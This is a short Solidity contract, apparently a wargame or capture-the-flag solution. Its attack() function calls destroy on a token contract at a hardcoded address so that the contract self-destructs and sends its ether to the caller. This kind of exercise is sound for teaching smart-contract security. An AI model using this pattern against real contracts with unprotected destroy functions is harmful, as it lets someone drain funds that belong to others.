// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface ISimpleToken{
    function destroy(address payable _to) external;
}

contract lostToken{
    ISimpleToken public immutable lost;

    constructor() public{
     lost = ISimpleToken(0x7344ECEaaC6a2bAD20e0f799f43dA74B8AA6c2bE);
    }


    function attack() external{
        lost.destroy(msg.sender);
    }

}